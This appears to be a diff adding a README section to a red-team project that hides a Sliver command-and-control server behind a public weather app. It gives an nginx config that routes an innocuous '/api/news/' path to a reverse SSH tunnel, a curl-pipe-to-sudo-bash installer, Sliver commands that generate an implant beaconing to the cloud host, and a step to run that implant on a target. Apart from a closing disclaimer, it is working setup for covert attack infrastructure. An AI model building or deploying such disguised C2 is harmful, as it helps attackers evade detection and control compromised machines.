@@ -400,6 +400,146 @@ For issues specific to:
 - **Docker**: Check Docker and Docker Compose logs
 - **Nginx**: Check nginx logs and configuration syntax
 
+## Alternate Deployment: Public Cover Server + Local C2
+
+If you want to split responsibilities across hosts—running the weather cover traffic in the cloud while keeping Sliver on a workstation—you can adapt this project without changing the application code. The high-level idea is:
+
+- Cloud VM (public IP/domain): serve the weather app and act as the reverse proxy entry point.
+- Local host (non-routable): run Sliver, keep implants and loot private, and expose it to the cloud VM through a reverse SSH tunnel.
+
+### Cloud Host (reverse proxy + weather app)
+
+1. Provision an Ubuntu/Debian VM with ports `80` and (optionally) `443` exposed.
+2. Install dependencies:
+   ```bash
+   sudo apt update
+   sudo apt install -y nginx git docker.io docker-compose-plugin
+   sudo systemctl enable nginx docker --now
+   ```
+3. Clone the repository and copy the standalone nginx template:
+   ```bash
+   git clone https://github.com/JongoDB/sliver-weather.git
+   ```
+   - Adjust `server_name` and any upstream ports inside `/etc/nginx/nginx.conf` to match your VM IP/domain. The default upstreams expect the weather app on `localhost:5000` and the SSH tunnel on `localhost:8080`.
+   - Use the sample configuration below as a starting point.
+4. Restart nginx to load the new configuration:
+   ```bash
+   sudo nginx -t
+   sudo systemctl restart nginx
+   ```
+5. Build and run the weather app (detached container is the simplest approach):
+   ```bash
+   cd sliver-weather/weather
+   sudo docker build -t weather-app .
+   sudo docker run -d --name weather-app --restart unless-stopped -p 5000:5000 weather-app
+   ```
+   - The nginx upstream `weather_upstream` now routes `/weather/` and `/api/weather/` to this container.
+6. (Optional) Enable HTTPS with a certificate manager on the VM. Update `/etc/nginx/nginx.conf` accordingly if you terminate TLS on nginx.
+
+#### Sample `nginx.conf`
+
+```
+# nginx/nginx.conf.template  (USED WHEN USE_TLS=true)
+
+#user  nginx;
+worker_processes  auto;
+
+events { worker_connections 1024; }
+
+http {
+  include       /etc/nginx/mime.types;
+  default_type  application/octet-stream;
+
+  sendfile on;
+  tcp_nopush on;
+  tcp_nodelay on;
+  keepalive_timeout 65;
+
+  log_format main '$remote_addr - $remote_user [$time_local] "$request" '
+                  '$status $body_bytes_sent "$http_referer" '
+                  '"$http_user_agent" "$http_x_forwarded_for"';
+  access_log /var/log/nginx/access.log main;
+  error_log  /var/log/nginx/error.log warn;
+
+  # (Optional) Docker DNS resolver helps when using variables in proxy_pass
+  # resolver 127.0.0.11 ipv6=off valid=30s;
+
+  upstream weather_upstream {
+    server localhost:5000;
+  }
+
+  upstream tunnel {
+    server localhost:8080;
+  }
+
+  server {
+    listen 80;
+    server_name example.com www.example.com;
+
+    location = / { return 302 /weather/; }
+
+    location /api/news/ {
+      proxy_pass http://tunnel;
+      proxy_set_header  X-Real-IP  $remote_addr;
+      proxy_set_header  X-Forwarded-For $proxy_add_x_forwarded_for;
+      proxy_set_header Host $http_host;
+      proxy_redirect off;
+    }
+
+    location /weather/ {
+      proxy_pass http://weather_upstream/;
+      proxy_http_version 1.1;
+      proxy_set_header Host              $host;
+      proxy_set_header X-Real-IP         $remote_addr;
+      proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
+      proxy_set_header X-Forwarded-Proto $scheme;
+      proxy_set_header Connection        "";
+    }
+
+    location /api/weather/ {
+      proxy_pass http://weather_upstream;
+      proxy_http_version 1.1;
+      proxy_set_header Host              $host;
+      proxy_set_header X-Real-IP         $remote_addr;
+      proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
+      proxy_set_header X-Forwarded-Proto $scheme;
+      proxy_set_header Connection        "";
+    }
+  }
+}
+```
+
+### Local Host (Sliver C2 + reverse tunnel endpoint)
+
+1. Install Sliver (example installer):
+   ```bash
+   curl https://sliver.sh/install | sudo bash
+   ```
+   The installer places `sliver-server` binaries under `/opt/sliver-server`.
+2. Launch Sliver and create an implant that points back to the cloud VM through the nginx `/api/news/` route:
+   ```bash
+   /opt/sliver-server
+   ```
+   Inside the Sliver console:
+   ```bash
+   generate --http http://<cloud-vm-public-ip-or-domain>/api/news/ --os linux --save /home/<user>/sliver-builds
+   http --lport 8080 --lhost 0.0.0.0
+   ```
+3. Create the reverse SSH tunnel so the cloud VM can reach your local listener:
+   ```bash
+   ssh -N -R 8080:localhost:8080 <cloud-user>@<cloud-vm-public-ip-or-domain>
+   ```
+   - `-R 8080:localhost:8080` binds port `8080` on the cloud VM (referenced by nginx as `tunnel`) to the Sliver listener on your local host.
+   - Keep this SSH session persistent (consider `autossh` or a systemd user unit).
+4. Transfer the generated implant to the target system, execute it, and monitor sessions from the local Sliver console as usual.
+
+### Operational Tips
+
+- Open the cloud firewall for ports `80/443` only; keep `8080` closed externally—the tunnel handles connectivity.
+- Monitor the tunnel service (`journalctl --user -u autossh` if you wrap it) to detect drops quickly.
+- When you regenerate implants or change listener ports, update both `nginx.conf` and the SSH reverse tunnel arguments so the path and port stay in sync.
+- Treat this split deployment as an advanced scenario: logging, alerting, and certificate management become your responsibility outside of Docker Compose.
+
 ---
 
 **Disclaimer**: This tool is intended for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Use responsibly and only in environments you own or have explicit permission to test.
